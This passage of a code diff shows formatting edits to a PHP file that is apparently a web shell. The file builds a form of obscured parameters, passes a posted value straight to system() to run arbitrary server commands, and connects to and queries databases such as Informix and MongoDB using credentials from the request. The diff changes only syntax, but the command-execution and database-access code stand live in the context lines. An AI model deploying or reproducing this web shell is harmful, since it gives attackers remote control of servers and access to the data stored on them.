                                 "__PARAM_17__",
                                 "ol_informix1170",
-                                "The Informix server name to use for the connection."
+                                "The Informix server name to use for the connection.",
                             ),
                             makeInput(
                                 "textarea",
                                 "Query",
                                 "__PARAM_18__",
                                 "SHOW DATABASES",
-                                "The query to run against the database. Leave empty to perform a connection test."
+                                "The query to run against the database. Leave empty to perform a connection test.",
                             ),
                             makeInput(
                                 "text",
                                 "Collection",
                                 "__PARAM_19__",
                                 "users",
-                                "The collection to query against for MongoDB."
+                                "The collection to query against for MongoDB.",
                             ),
                             '<script>
                                 function hideAll() {
@@ -2549,10 +2466,10 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                    }
                                 });
                             </script>',
-                        )
+                        ],
                     ),
-                ),
-                $page
+                ],
+                $page,
             );
             break;
     }
@@ -2591,7 +2508,7 @@ if (isPost()) {
             system($_POST["__PARAM_1__"]);
             break;
         case $QUERY_DATABASES:
-            $connection = connectAndQueryDatabase(
+            connectAndQueryDatabase(
                 $_POST["__PARAM_1__"],
                 $_POST["__PARAM_4__"],
                 $_POST["__PARAM_5__"],
@@ -2610,17 +2527,8 @@ if (isPost()) {
                 $_POST["__PARAM_14__"],
                 $_POST["__PARAM_16__"],
                 $_POST["__PARAM_18__"],
-                $_POST["__PARAM_19__"]
+                $_POST["__PARAM_19__"],
             );
-
-            /*if ($pdo) {
-                $stmt      = $pdo->query("SHOW DATABASES");
-                $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
-                echo "Databases:\n";
-                foreach ($databases as $database) {
-                    echo "- $database\n";
-                }
-            }*/
             break;
         default:
             echo "Unrecognized operation '$operation'";
